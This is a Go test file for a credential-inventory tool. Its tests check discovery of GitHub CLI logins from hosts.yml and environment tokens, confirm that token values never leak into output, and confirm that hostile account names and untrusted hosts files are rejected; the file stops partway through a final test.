package gh

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/VSN2015/agentctl/internal/model"
	"github.com/VSN2015/agentctl/internal/scan"
)

const canary = "CANARY-SECRET-DO-NOT-PRINT"

const basicHosts = `github.com:
  git_protocol: https
  user: alice
  oauth_token: ` + canary + `
  users:
    alice:
      oauth_token: ` + canary + `
ghe.example.com:
  user: bob
`

// writeHosts writes a synthetic hosts file under dir/gh and returns its path.
func writeHosts(t *testing.T, dir, body string) string {
	t.Helper()
	p := filepath.Join(dir, "gh", "hosts.yml")
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func envOf(home string, vars map[string]string) scan.Env {
	return scan.Env{Home: home, Getenv: func(k string) string { return vars[k] }}
}

func ids(cs []model.Credential) []string {
	var out []string
	for _, c := range cs {
		out = append(out, c.ID)
	}
	sort.Strings(out)
	return out
}

func credByID(t *testing.T, cs []model.Credential, id string) model.Credential {
	t.Helper()
	for _, c := range cs {
		if c.ID == id {
			return c
		}
	}
	t.Fatalf("no credential %q in %v", id, ids(cs))
	return model.Credential{}
}

func TestDiscoverHosts(t *testing.T) {
	home := t.TempDir()
	p := writeHosts(t, filepath.Join(home, ".config"), basicHosts)
	creds, err := New(nil).Discover(envOf(home, nil))
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com", "bob@ghe.example.com"}) {
		t.Fatalf("ids = %v", got)
	}
	for _, c := range creds {
		want := map[string]string{"alice@github.com": "alice", "bob@ghe.example.com": "bob"}[c.ID]
		wantHost := map[string]string{"alice@github.com": "github.com", "bob@ghe.example.com": "ghe.example.com"}[c.ID]
		if c.Identity != want || c.Host != wantHost || c.Kind != "file-host" || c.Tool != "gh" || !reflect.DeepEqual(c.Files, []string{p}) {
			t.Errorf("%s: %+v", c.ID, c)
		}
	}
	if s := fmt.Sprintf("%+v", creds); strings.Contains(s, canary) {
		t.Fatalf("token leaked: %s", s)
	}
}

func TestDiscoverThreeLogins(t *testing.T) {
	home := t.TempDir()
	p := writeHosts(t, filepath.Join(home, ".config"),
		"github.com:\n  user: alice\n  users:\n    alice:\n      oauth_token: "+canary+"\n    bob:\n")
	creds, err := New(nil).Discover(envOf(home, map[string]string{"GH_TOKEN": canary}))
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); !reflect.DeepEqual(got, []string{"@github.com", "alice@github.com", "bob@github.com"}) {
		t.Fatalf("ids = %v", got)
	}
	var order []string
	for _, c := range creds {
		order = append(order, c.ID)
	}
	if !sort.StringsAreSorted(order) {
		t.Errorf("not sorted by ID: %v", order)
	}
	a := credByID(t, creds, "alice@github.com")
	if a.Kind != "file-host" || a.Identity != "alice" || len(a.EnvVars) != 0 || !reflect.DeepEqual(a.Files, []string{p}) || a.Host != "github.com" || a.Source != "file" {
		t.Errorf("alice: %+v", a)
	}
	b := credByID(t, creds, "bob@github.com")
	if b.Kind != "file-host-inactive" || b.Identity != "bob" || b.Host != "github.com" {
		t.Errorf("bob: %+v", b)
	}
	e := credByID(t, creds, "@github.com")
	if e.Kind != "env-token" || e.Source != "env" || !reflect.DeepEqual(e.EnvVars, []string{"GH_TOKEN"}) || e.Identity != "" ||
		e.Label != "GH_TOKEN@github.com" || len(e.Files) != 0 || e.Host != "github.com" {
		t.Errorf("env: %+v", e)
	}
	if strings.Contains(fmt.Sprintf("%+v", creds), canary) {
		t.Error("token leaked")
	}
}

func TestDiscoverLegacyUserOnly(t *testing.T) {
	home := t.TempDir()
	writeHosts(t, filepath.Join(home, ".config"), "github.com:\n  user: alice\n  oauth_token: "+canary+"\n")
	creds, _ := New(nil).Discover(envOf(home, nil))
	if len(creds) != 1 || creds[0].ID != "alice@github.com" || creds[0].Kind != "file-host" || creds[0].Identity != "alice" {
		t.Fatalf("%+v", creds)
	}
	writeHosts(t, filepath.Join(home, ".config"), "github.com:\n  oauth_token: "+canary+"\n")
	creds, _ = New(nil).Discover(envOf(home, nil))
	if len(creds) != 1 || creds[0].ID != "github.com" || creds[0].Kind != "file-host" || creds[0].Identity != "" || creds[0].Host != "github.com" {
		t.Fatalf("bare: %+v", creds)
	}
	if strings.Contains(fmt.Sprintf("%+v", creds), canary) {
		t.Error("token leaked")
	}
}

func TestDiscoverUsersOneEntry(t *testing.T) {
	disc := func(body string) []model.Credential {
		home := t.TempDir()
		writeHosts(t, filepath.Join(home, ".config"), body)
		creds, err := New(nil).Discover(envOf(home, nil))
		if err != nil {
			t.Fatal(err)
		}
		return creds
	}
	creds := disc("github.com:\n  user: alice\n  users:\n    alice:\n")
	if len(creds) != 1 || creds[0].ID != "alice@github.com" || creds[0].Kind != "file-host" {
		t.Errorf("one entry: %+v", creds)
	}
	creds = disc("github.com:\n  users:\n    alice:\n")
	// no user: the host-only credential is the one in effect, alongside the inactive account
	if len(creds) != 2 || creds[0].ID != "alice@github.com" || creds[0].Kind != "file-host-inactive" || creds[1].ID != "github.com" || creds[1].Kind != "file-host" {
		t.Errorf("no user: %+v", creds)
	}
	// keyring form: a null value must still create the account
	creds = disc("github.com:\n  users:\n    bob:\n")
	if len(creds) != 2 || creds[0].ID != "bob@github.com" || creds[1].ID != "github.com" {
		t.Errorf("null value: %+v", creds)
	}
	// scalar and mapping values are accepted too, never decoded
	creds = disc("github.com:\n  user: bob\n  users:\n    bob: " + canary + "\n    eve:\n      oauth_token: " + canary + "\n")
	if got := ids(creds); !reflect.DeepEqual(got, []string{"bob@github.com", "eve@github.com"}) || strings.Contains(fmt.Sprintf("%+v", creds), canary) {
		t.Errorf("scalar/mapping: %+v", creds)
	}
}

func TestDiscoverActiveUserMissingFromUsers(t *testing.T) {
	// users: lists accounts and user: names none of them: gh uses the host token, so nothing is the active login
	creds, _ := discoverBody(t, "github.com:\n  user: mallory\n  users:\n    alice:\n", nil)
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com", "github.com"}) {
		t.Fatalf("ids = %v", got)
	}
	if c := credByID(t, creds, "github.com"); c.Kind != "file-host" || c.Identity != "" {
		t.Errorf("host: %+v", c)
	}
	if c := credByID(t, creds, "alice@github.com"); c.Kind != "file-host-inactive" {
		t.Errorf("alice: %+v", c)
	}
	if !contains(creds[0].Notes, "1 host in the gh hosts file names an active account that is not in its account list") || strings.Contains(strings.Join(creds[0].Notes, "|"), "invalid name") || strings.Contains(fmt.Sprintf("%+v", creds), "mallory") {
		t.Errorf("notes %q", creds[0].Notes)
	}
	two, _ := discoverBody(t, "github.com:\n  user: mallory\n  users:\n    alice:\nb.example.com:\n  user: eve\n  users:\n    bob:\n", nil)
	if !contains(two[0].Notes, "2 hosts in the gh hosts file name an active account that is not in their account list") {
		t.Errorf("plural notes %q", two[0].Notes)
	}
	// legacy layouts keep user: alone as the active account
	for _, body := range []string{"github.com:\n  user: mallory\n", "github.com:\n  user: mallory\n  users: {}\n", "github.com:\n  user: mallory\n  users:\n"} {
		creds, _ := discoverBody(t, body, nil)
		if got := ids(creds); !reflect.DeepEqual(got, []string{"mallory@github.com"}) || creds[0].Kind != "file-host" {
			t.Errorf("legacy %q: %+v", body, creds)
		}
	}
}

func TestDiscoverHostileAccountNames(t *testing.T) {
	home := t.TempDir()
	writeHosts(t, filepath.Join(home, ".config"), `github.com:
  user: alice
  users:
    "a\u202Eb":
    "a\u202Db":
    "x\x1b[31m":
    "":
    env:
b:
  users:
    "c@a":
`)
	run := func() []model.Credential {
		creds, err := New(nil).Discover(envOf(home, map[string]string{"GH_TOKEN": canary}))
		if err != nil {
			t.Fatal(err)
		}
		return creds
	}
	creds := run()
	seen, labels := map[string]bool{}, map[string]bool{}
	for _, c := range creds {
		if seen[c.ID] || labels[c.Label] {
			t.Errorf("duplicate ID or label %q %q", c.ID, c.Label)
		}
		seen[c.ID], labels[c.Label] = true, true
		if model.Sanitize(c.ID) != c.ID || model.Sanitize(c.Label) != c.Label || model.Sanitize(c.Identity) != c.Identity {
			t.Errorf("unsanitised: %q %q %q", c.ID, c.Label, c.Identity)
		}
		if strings.HasPrefix(c.ID, "@") && c.ID != "@github.com" {
			t.Errorf("empty account created %q", c.ID)
		}
		if strings.Contains(c.Label, "\x1b") || strings.Contains(c.Label, "\u202e") {
			t.Errorf("control in label %q", c.Label)
		}
	}
	// env-named (alice is not listed, so the host-only credential is the active one), host b (its only account name is invalid: legacy entry), plus the env credential;
	// the hostile names are rejected, so none reaches an ID or label
	if len(creds) != 4 {
		t.Errorf("got %d credentials: %v", len(creds), ids(creds))
	}
	if c := credByID(t, creds, "env@github.com"); c.Host != "github.com" {
		t.Errorf("env account: %+v", c)
	}
	credByID(t, creds, "@github.com")
	credByID(t, creds, "b")
	if !reflect.DeepEqual(ids(creds), ids(run())) {
		t.Error("IDs differ between runs")
	}
}

func TestDiscoverGHHostUnchanged(t *testing.T) {
	home := t.TempDir()
	creds, _ := New(nil).Discover(envOf(home, map[string]string{"GH_HOST": "ghe.example.com", "GH_ENTERPRISE_TOKEN": canary}))
	if len(creds) != 1 || creds[0].ID != "@ghe.example.com" || creds[0].Host != "ghe.example.com" || creds[0].Kind != "env-token" {
		t.Fatalf("%+v", creds)
	}
	creds, _ = New(nil).Discover(envOf(home, map[string]string{"GH_HOST": "ghe.example.com", "GH_TOKEN": canary}))
	if len(creds) != 1 || creds[0].ID != "@github.com" {
		t.Fatalf("GH_TOKEN only: %+v", creds)
	}
}

func TestDiscoverConfigDirPrecedence(t *testing.T) {
	home, xdg, gd := t.TempDir(), t.TempDir(), t.TempDir()
	writeHosts(t, filepath.Join(home, ".config"), "home.example.com:\n  user: a\n")
	run := func(vars map[string]string) []string {
		cs, err := New(nil).Discover(envOf(home, vars))
		if err != nil {
			t.Fatal(err)
		}
		return ids(cs)
	}
	if got := run(nil); !reflect.DeepEqual(got, []string{"a@home.example.com"}) {
		t.Fatalf("home: %v", got)
	}
	if err := os.MkdirAll(filepath.Join(xdg, "gh"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(xdg, "gh", "hosts.yml"), []byte("xdg.example.com:\n  user: a\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := run(map[string]string{"XDG_CONFIG_HOME": xdg}); !reflect.DeepEqual(got, []string{"a@xdg.example.com"}) {
		t.Fatalf("xdg: %v", got)
	}
	if err := os.WriteFile(filepath.Join(gd, "hosts.yml"), []byte("gd.example.com:\n  user: a\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := run(map[string]string{"XDG_CONFIG_HOME": xdg, "GH_CONFIG_DIR": gd}); !reflect.DeepEqual(got, []string{"a@gd.example.com"}) {
		t.Fatalf("GH_CONFIG_DIR: %v", got)
	}
}

func TestDiscoverEnvTokens(t *testing.T) {
	home := t.TempDir()
	creds, err := New(nil).Discover(envOf(home, map[string]string{"GH_TOKEN": canary}))
	if err != nil || len(creds) != 1 {
		t.Fatalf("%v %v", creds, err)
	}
	c := creds[0]
	if c.ID != "@github.com" || c.Label != "GH_TOKEN@github.com" || c.Host != "github.com" || c.Kind != "env-token" || c.Source != "env" || !reflect.DeepEqual(c.EnvVars, []string{"GH_TOKEN"}) {
		t.Errorf("%+v", c)
	}
	if strings.Contains(fmt.Sprintf("%+v", creds), canary) {
		t.Error("token value stored")
	}

	creds, _ = New(nil).Discover(envOf(home, map[string]string{"GH_ENTERPRISE_TOKEN": canary, "GH_HOST": "ghe.example.com"}))
	if len(creds) != 1 || creds[0].ID != "@ghe.example.com" || creds[0].Kind != "env-token" ||
		!reflect.DeepEqual(creds[0].EnvVars, []string{"GH_ENTERPRISE_TOKEN"}) {
		t.Errorf("enterprise: %+v", creds)
	}

	// the env token is its own credential next to the stored ones
	writeHosts(t, filepath.Join(home, ".config"), basicHosts)
	creds, _ = New(nil).Discover(envOf(home, map[string]string{"GH_TOKEN": canary}))
	if got := ids(creds); !reflect.DeepEqual(got, []string{"@github.com", "alice@github.com", "bob@ghe.example.com"}) {
		t.Fatalf("ids: %v", got)
	}
	for _, c := range creds {
		if c.Kind == "file-host" && len(c.EnvVars) != 0 {
			t.Errorf("env vars merged into stored credential: %+v", c)
		}
	}
}

func TestDiscoverEmptyAndUnreadable(t *testing.T) {
	for name, setup := range map[string]func(home string){
		"no dir": func(string) {},
		"empty":  func(h string) { writeHosts(t, filepath.Join(h, ".config"), "") },
	} {
		t.Run(name, func(t *testing.T) {
			home := t.TempDir()
			setup(home)
			creds, err := New(nil).Discover(envOf(home, nil))
			if err != nil || len(creds) != 0 {
				t.Fatalf("creds=%v err=%v", creds, err)
			}
		})
	}
	for name, tc := range map[string]struct {
		setup func(home string)
		note  string
	}{
		"directory": {func(h string) { _ = os.MkdirAll(filepath.Join(h, ".config", "gh", "hosts.yml"), 0o700) }, "could not read hosts file"},
		"garbage":   {func(h string) { writeHosts(t, filepath.Join(h, ".config"), "\x00\x01: [}{\n\t- :") }, "could not parse hosts file"},
	} {
		t.Run(name, func(t *testing.T) {
			home := t.TempDir()
			tc.setup(home)
			s := New(nil)
			creds, err := s.Discover(envOf(home, nil))
			if err != nil || len(creds) != 1 {
				t.Fatalf("creds=%v err=%v", creds, err)
			}
			c := creds[0]
			if c.ID != "unreadable" || c.Kind != "unknown" || c.Source != "file" || len(c.Files) != 1 || !reflect.DeepEqual(c.Notes, []string{tc.note}) {
				t.Errorf("%+v", c)
			}
			_, err = s.Resolve(context.Background(), c)
			var skip *scan.SkipError
			if !errors.As(err, &skip) {
				t.Errorf("resolve: %v", err)
			}
		})
	}
}

func TestDiscoverEnterpriseEnvTokens(t *testing.T) {
	home := t.TempDir()
	vars := map[string]string{"GH_ENTERPRISE_TOKEN": canary}
	// A: host in hosts.yml, no GH_HOST
	writeHosts(t, filepath.Join(home, ".config"), "ghe.example.com:\n  user: bob\nacme.ghe.com:\n  user: c\ngithub.com:\n  user: a\n")
	creds, _ := New(nil).Discover(envOf(home, vars))
	if got := ids(creds); !reflect.DeepEqual(got, []string{"@ghe.example.com", "a@github.com", "bob@ghe.example.com", "c@acme.ghe.com"}) {
		t.Fatalf("A ids: %v", got)
	}
	if c := credByID(t, creds, "@ghe.example.com"); c.Kind != "env-token" || !reflect.DeepEqual(c.EnvVars, []string{"GH_ENTERPRISE_TOKEN"}) {
		t.Errorf("A env: %+v", c)
	}
	fr := &fakeRunner{out: ghAnswer("bob")}
	if r, err := New(fr).Resolve(context.Background(), credByID(t, creds, "@ghe.example.com")); err != nil || r == nil ||
		fr.n != 1 || !reflect.DeepEqual(fr.args, []string{"api", "-i", "--hostname", "ghe.example.com", "user"}) {
		t.Errorf("A resolve: %v %v calls=%d args=%v", r, err, fr.n, fr.args)
	}
	if c := credByID(t, creds, "bob@ghe.example.com"); len(c.EnvVars) != 0 {
		t.Errorf("A bob: %+v", c)
	}
	// *.ghe.com takes GH_TOKEN; GH_TOKEN alone gives nothing for ghe.example.com
	creds, _ = New(nil).Discover(envOf(home, map[string]string{"GITHUB_TOKEN": canary}))
	if got := ids(creds); !reflect.DeepEqual(got, []string{"@acme.ghe.com", "@github.com", "a@github.com", "bob@ghe.example.com", "c@acme.ghe.com"}) {
		t.Fatalf("ghe.com ids: %v", got)
	}
	for _, id := range []string{"@github.com", "@acme.ghe.com"} {
		if c := credByID(t, creds, id); !reflect.DeepEqual(c.EnvVars, []string{"GITHUB_TOKEN"}) {
			t.Errorf("%s: %v", id, c.EnvVars)
		}
	}
	// B: no host anywhere
	home = t.TempDir()
	s := New(nil)
	creds, _ = s.Discover(envOf(home, vars))
	if len(creds) != 1 {
		t.Fatalf("B: %+v", creds)
	}
	c := creds[0]
	if c.ID != "enterprise" || c.Host != "" || c.Kind != "env-token" || c.Source != "env" || !reflect.DeepEqual(c.EnvVars, []string{"GH_ENTERPRISE_TOKEN"}) ||
		!reflect.DeepEqual(c.Notes, []string{"host unknown"}) || strings.Contains(fmt.Sprintf("%+v", c), canary) {
		t.Errorf("B: %+v", c)
	}
	var skip *scan.SkipError
	if _, err := s.Resolve(context.Background(), c); !errors.As(err, &skip) {
		t.Errorf("B resolve: %v", err)
	}
	// a real host literally named "enterprise": stored account plus env credential, no placeholder
	home = t.TempDir()
	writeHosts(t, filepath.Join(home, ".config"), "enterprise:\n  user: x\n")
	s = New(&fakeRunner{})
	creds, _ = s.Discover(envOf(home, vars))
	if got := ids(creds); !reflect.DeepEqual(got, []string{"@enterprise", "x@enterprise"}) {
		t.Fatalf("named enterprise: %v", got)
	}
	if c := credByID(t, creds, "@enterprise"); c.Kind != "env-token" || c.Host != "enterprise" || !reflect.DeepEqual(c.EnvVars, []string{"GH_ENTERPRISE_TOKEN"}) {
		t.Errorf("named enterprise env: %+v", c)
	}
}

func TestDiscoverYAMLErrorsNeverEchoContent(t *testing.T) {
	for name, body := range map[string]string{
		"scalar host entry": "github.com: " + canary + "\n", // a scalar entry no longer fails the file (TestDiscoverScalarHostEntryIsSkipped)
		"syntax error":      "github.com: [" + canary + "\n",
		// tagged scalar users no longer fail the file: TestDiscoverJunkEntryNeverHidesLogins
	} {
		t.Run(name, func(t *testing.T) {
			home := t.TempDir()
			writeHosts(t, filepath.Join(home, ".config"), body)
			creds, err := New(nil).Discover(envOf(home, nil))
			if out := fmt.Sprintf("%+v %v", creds, err); strings.Contains(out, canary) {
				t.Errorf("canary leaked: %s", out)
			}
			if err != nil || len(creds) != 1 || creds[0].ID != "unreadable" {
				t.Errorf("creds: %+v err %v", creds, err)
			}
		})
	}
}

func TestHostEntryHasNoTokenField(t *testing.T) {
	typ := reflect.TypeOf(hostEntry{})
	if typ.NumField() != 3 || typ.Field(0).Name != "User" || typ.Field(1).Name != "Users" || typ.Field(2).Name != "badUser" {
		t.Fatalf("hostEntry fields: %v", typ)
	}
	if typ.Field(1).Type != reflect.TypeOf(map[string]account{}) || reflect.TypeOf(account{}).NumField() != 0 {
		t.Fatalf("Users must be map[string]account with an empty account")
	}
	for i := 0; i < typ.NumField(); i++ {
		if strings.Contains(strings.ToLower(typ.Field(i).Name), "token") {
			t.Errorf("token field %s", typ.Field(i).Name)
		}
	}
}

func TestParseAPIResponse(t *testing.T) {
	body := "\r\n{\"login\":\"alice\"}"
	tests := []struct {
		name, raw string
		login     string
		scopes    []string
		readable  bool
		wantErr   bool
	}{
		{"scopes", "HTTP/2.0 200 OK\nX-Oauth-Scopes: repo, workflow, admin:org\r\nServer: x\r\n" + body, "alice", []string{"repo", "workflow", "admin:org"}, true, false},
		{"empty header", "HTTP/2.0 200 OK\nX-Oauth-Scopes: \r\n" + body, "alice", []string{}, true, false},
		{"absent", "HTTP/2.0 200 OK\nServer: x\r\n" + body, "alice", nil, false, false},
		{"lower case", "HTTP/1.1 200 OK\nx-oauth-scopes: repo\r\n" + body, "alice", []string{"repo"}, true, false},
		{"not json", "HTTP/2.0 200 OK\nX-Oauth-Scopes: repo\r\n\r\n<html>" + canary, "", nil, false, true},
		{"scopes only header", "HTTP/2.0 200 OK\nX-Oauth-Scopes: repo\r\n" + body, "alice", []string{"repo"}, true, false},
		{"no headers", "HTTP/2.0 200 OK\n" + body, "alice", nil, false, false},
		{"no blank line", "HTTP/2.0 200 OK", "", nil, false, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			login, scopes, readable, err := ParseAPIResponse([]byte(tc.raw))
			if (err != nil) != tc.wantErr {
				t.Fatalf("err = %v", err)
			}
			if err != nil && strings.Contains(err.Error(), canary) {
				t.Errorf("error echoes body: %v", err)
			}
			if login != tc.login || readable != tc.readable || !reflect.DeepEqual(scopes, tc.scopes) {
				t.Errorf("got %q %#v %v", login, scopes, readable)
			}
		})
	}
}

type fakeRunner struct {
	name string
	args []string
	env  []string
	out  []byte
	err  error
	n    int // number of subprocess calls
}

func (f *fakeRunner) Run(_ context.Context, name string, args []string, env []string) ([]byte, error) {
	f.n++
	f.name, f.args, f.env = name, args, env
	return f.out, f.err
}

func TestResolveRunsExactlyOneReadOnlyCommand(t *testing.T) {
	f := &fakeRunner{out: []byte("HTTP/2.0 200 OK\nX-Oauth-Scopes: repo\r\n\r\n{\"login\":\"bob\"}")}
	r, err := New(f).Resolve(context.Background(), model.Credential{Tool: "gh", ID: "bob@ghe.example.com", Kind: "file-host", Identity: "bob", Host: "ghe.example.com"})
	if err != nil {
		t.Fatal(err)
	}
	if f.name != "gh" || !reflect.DeepEqual(f.args, []string{"api", "-i", "--hostname", "ghe.example.com", "user"}) {
		t.Errorf("command: %s %v", f.name, f.args)
	}
	for _, want := range []string{"GH_NO_UPDATE_NOTIFIER=1", "GH_PROMPT_DISABLED=1"} {
		found := false
		for _, e := range f.env {
			found = found || e == want
		}
		if !found {
			t.Errorf("env lacks %s: %v", want, f.env)
		}
	}
	if r.Identity != "bob" || !r.ScopesReadable || !reflect.DeepEqual(r.Scopes, []string{"repo"}) {
		t.Errorf("%+v", r)
	}
}

func TestResolveDegrades(t *testing.T) {
	c := model.Credential{Tool: "gh", ID: "github.com", Kind: "file-host", Host: "github.com"}
	_, err := New(&fakeRunner{err: fmt.Errorf("run: %w", exec.ErrNotFound)}).Resolve(context.Background(), c)
	var skip *scan.SkipError
	if !errors.As(err, &skip) || skip.Reason != "gh not installed" {
		t.Errorf("not found: %v", err)
	}
	_, err = New(&fakeRunner{out: []byte(canary), err: errors.New("exit status 1")}).Resolve(context.Background(), c)
	if err == nil || errors.As(err, &skip) || strings.Contains(err.Error(), canary) {
		t.Errorf("non-zero exit: %v", err)
	}
}

// A hosts file in the current directory must never be read when the home is unknown or a
// configuration directory is relative.
func TestDiscoverNeverReadsHostsFromWorkingDirectory(t *testing.T) {
	cwd := t.TempDir()
	writeHosts(t, filepath.Join(cwd, ".config"), "evil.example:\n  user: mallory\n")
	t.Chdir(cwd)
	for name, tc := range map[string]struct {
		home string
		vars map[string]string
		note string
	}{
		"empty home":      {"", nil, "hosts file skipped: no home directory"},
		"relative XDG":    {"", map[string]string{"XDG_CONFIG_HOME": ".config"}, "hosts file skipped: configuration directory is not an absolute path"},
		"relative GH dir": {t.TempDir(), map[string]string{"GH_CONFIG_DIR": ".config/gh"}, "hosts file skipped: configuration directory is not an absolute path"},
	} {
		t.Run(name, func(t *testing.T) {
			vars := map[string]string{"GH_ENTERPRISE_TOKEN": "x"}
			for k, v := range tc.vars {
				vars[k] = v
			}
			creds, err := New(nil).Discover(envOf(tc.home, vars))
			if err != nil {
				t.Fatal(err)
			}
			for _, c := range creds {
				if c.ID == "evil.example" {
					t.Fatalf("hosts file of the working directory was read: %+v", c)
				}
				if !contains(c.Notes, tc.note) {
					t.Errorf("%s: notes = %q, want %q", c.ID, c.Notes, tc.note)
				}
			}
			if len(creds) == 0 {
				t.Fatal("expected the enterprise placeholder to carry the note")
			}
		})
	}
}

func contains(s []string, v string) bool {
	for _, x := range s {
		if x == v {
			return true
		}
	}
	return false
}

func TestDiscoverRefusesFIFOAndOversizeHostsFile(t *testing.T) {
	for name, mk := range map[string]func(p string) error{
		"fifo": func(p string) error { return syscall.Mkfifo(p, 0o600) },
		"oversize": func(p string) error {
			return os.WriteFile(p, []byte("github.com:\n  user: "+strings.Repeat("a", 1<<20)+"\n"), 0o600)
		},
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			p := filepath.Join(dir, "gh", "hosts.yml")
			if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := mk(p); err != nil {
				t.Skip(err)
			}
			done := make(chan []model.Credential, 1)
			go func() {
				c, _ := New(nil).Discover(envOf(dir, map[string]string{"GH_CONFIG_DIR": filepath.Join(dir, "gh")}))
				done <- c
			}()
			select {
			case creds := <-done:
				if len(creds) != 1 || creds[0].ID != "unreadable" || !contains(creds[0].Notes, "could not read hosts file") {
					t.Fatalf("%+v", creds)
				}
			case <-time.After(3 * time.Second):
				t.Fatal("Discover did not return")
			}
		})
	}
}

const threeLogins = "github.com:\n  user: alice\n  users:\n    alice:\n      oauth_token: " + canary + "\n    bob:\n"

func ghAnswer(login string) []byte {
	return []byte("HTTP/2.0 200 OK\nX-Oauth-Scopes: repo\r\n\r\n{\"login\":\"" + login + "\"}")
}

// resolveAll discovers the fixture and resolves every credential in order, returning results by ID.
func resolveAll(t *testing.T, hosts string, vars map[string]string, f *fakeRunner) (map[string]*model.Resolution, map[string]error) {
	t.Helper()
	home := t.TempDir()
	writeHosts(t, filepath.Join(home, ".config"), hosts)
	s := New(f)
	creds, err := s.Discover(envOf(home, vars))
	if err != nil {
		t.Fatal(err)
	}
	res, errs := map[string]*model.Resolution{}, map[string]error{}
	for _, c := range creds {
		res[c.ID], errs[c.ID] = s.Resolve(context.Background(), c)
	}
	return res, errs
}

func TestResolveOnlyCredentialInEffect(t *testing.T) {
	wantArgs := func(t *testing.T, f *fakeRunner, host string) {
		t.Helper()
		if f.n != 1 || !reflect.DeepEqual(f.args, []string{"api", "-i", "--hostname", host, "user"}) {
			t.Errorf("calls=%d args=%v", f.n, f.args)
		}
		for _, want := range []string{"GH_NO_UPDATE_NOTIFIER=1", "GH_PROMPT_DISABLED=1"} {
			if !contains(f.env, want) {
				t.Errorf("env lacks %s: %v", want, f.env)
			}
		}
	}
	t.Run("no env token", func(t *testing.T) {
		f := &fakeRunner{out: ghAnswer("alice")}
		res, errs := resolveAll(t, threeLogins, nil, f)
		wantArgs(t, f, "github.com")
		if res["alice@github.com"] == nil || res["alice@github.com"].Identity != "alice" || errs["alice@github.com"] != nil {
			t.Errorf("alice: %v %v", res["alice@github.com"], errs["alice@github.com"])
		}
		if res["bob@github.com"] != nil || errs["bob@github.com"] != nil {
			t.Errorf("bob: %v %v", res["bob@github.com"], errs["bob@github.com"])
		}
	})
	t.Run("with env token", func(t *testing.T) {
		f := &fakeRunner{out: ghAnswer("alice")}
		res, errs := resolveAll(t, threeLogins, map[string]string{"GH_TOKEN": canary}, f)
		wantArgs(t, f, "github.com")
		if r := res["@github.com"]; r == nil || r.Identity != "alice" || !r.ScopesReadable || errs["@github.com"] != nil {
			t.Errorf("env: %v %v", r, errs["@github.com"])
		}
		for _, id := range []string{"alice@github.com", "bob@github.com"} {
			if res[id] != nil || errs[id] != nil {
				t.Errorf("%s: %v %v", id, res[id], errs[id])
			}
		}
	})
	t.Run("login mismatch", func(t *testing.T) {
		f := &fakeRunner{out: ghAnswer("bob")}
		res, errs := resolveAll(t, threeLogins, nil, f)
		err := errs["alice@github.com"]
		if err == nil || res["alice@github.com"] != nil {
			t.Fatalf("want error, got %v %v", res["alice@github.com"], err)
		}
		for _, bad := range []string{"bob", "alice", canary} {
			if strings.Contains(err.Error(), bad) {
				t.Errorf("error leaks %q: %v", bad, err)
			}
		}
	})
	t.Run("bare host", func(t *testing.T) {
		f := &fakeRunner{out: ghAnswer("whoever")}
		res, errs := resolveAll(t, "github.com:\n  oauth_token: "+canary+"\n", nil, f)
		if r := res["github.com"]; r == nil || r.Identity != "whoever" || errs["github.com"] != nil {
			t.Errorf("%v %v", r, errs["github.com"])
		}
	})
	t.Run("enterprise env token", func(t *testing.T) {
		f := &fakeRunner{out: ghAnswer("bob")}
		res, errs := resolveAll(t, "ghe.example.com:\n  user: bob\n", map[string]string{"GH_ENTERPRISE_TOKEN": canary}, f)
		wantArgs(t, f, "ghe.example.com")
		if res["@ghe.example.com"] == nil || res["bob@ghe.example.com"] != nil || errs["bob@ghe.example.com"] != nil {
			t.Errorf("%v %v", res, errs)
		}
	})
	t.Run("gh failure", func(t *testing.T) {
		f := &fakeRunner{out: []byte(canary), err: errors.New("exit status 1")}
		res, errs := resolveAll(t, threeLogins, nil, f)
		if f.n != 1 || errs["alice@github.com"] == nil || !strings.Contains(errs["alice@github.com"].Error(), "gh api user failed") {
			t.Errorf("calls=%d errs=%v", f.n, errs)
		}
		if errs["bob@github.com"] != nil || res["bob@github.com"] != nil {
			t.Errorf("bob: %v %v", res["bob@github.com"], errs["bob@github.com"])
		}
	})
	t.Run("placeholder", func(t *testing.T) {
		f := &fakeRunner{}
		_, errs := resolveAll(t, "", map[string]string{"GH_ENTERPRISE_TOKEN": canary}, f)
		var skip *scan.SkipError
		if !errors.As(errs["enterprise"], &skip) || f.n != 0 {
			t.Errorf("%v calls=%d", errs, f.n)
		}
	})
}

func TestResolveLoginCheckIgnoresCase(t *testing.T) {
	c := model.Credential{Tool: "gh", ID: "Alice@github.com", Kind: "file-host", Identity: "Alice", Host: "github.com"}
	if r, err := New(&fakeRunner{out: ghAnswer("alice")}).Resolve(context.Background(), c); err != nil || r == nil {
		t.Errorf("case difference: %v %v", r, err)
	}
	if r, err := New(&fakeRunner{out: ghAnswer("bob")}).Resolve(context.Background(), c); err == nil || r != nil {
		t.Errorf("different name: %v %v", r, err)
	}
}

func TestDiscoverToleratesMalformedUsers(t *testing.T) {
	for name, users := range map[string]string{"scalar": "users: foo", "list": "users:\n    - alice\n    - bob", "null": "users:"} {
		t.Run(name, func(t *testing.T) {
			home := t.TempDir()
			writeHosts(t, filepath.Join(home, ".config"), "ghe.example.com:\n  user: bob\ngithub.com:\n  user: alice\n  "+strings.ReplaceAll(users, "\n", "\n  ")+"\n")
			creds, err := New(nil).Discover(envOf(home, nil))
			if err != nil {
				t.Fatal(err)
			}
			if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com", "bob@ghe.example.com"}) {
				t.Fatalf("ids %v", got)
			}
			if c := credByID(t, creds, "alice@github.com"); c.Kind != "file-host" || len(c.Notes) != 0 {
				t.Errorf("%+v", c)
			}
		})
	}
}

func TestDiscoverRejectsInvalidHostNames(t *testing.T) {
